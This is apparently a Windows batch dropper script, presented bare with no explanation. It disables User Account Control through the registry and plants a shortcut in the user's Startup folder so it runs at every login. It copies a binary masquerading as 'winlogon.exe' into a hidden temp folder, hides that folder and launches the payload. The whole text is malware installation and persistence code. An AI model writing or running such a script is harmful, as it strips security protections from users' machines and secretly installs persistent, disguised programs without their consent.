@echo off
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA /f /t REG_DWORD /d 0
xcopy "%CD%\init.dll.lnk" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
xcopy "%CD%\winlogon.exe" "%HOMEDRIVE%\tmp\winsvr\logon\" /O /X /H /K /I
attrib +h %HOMEDRIVE%\tmp
start %CD%\init.dll.lnk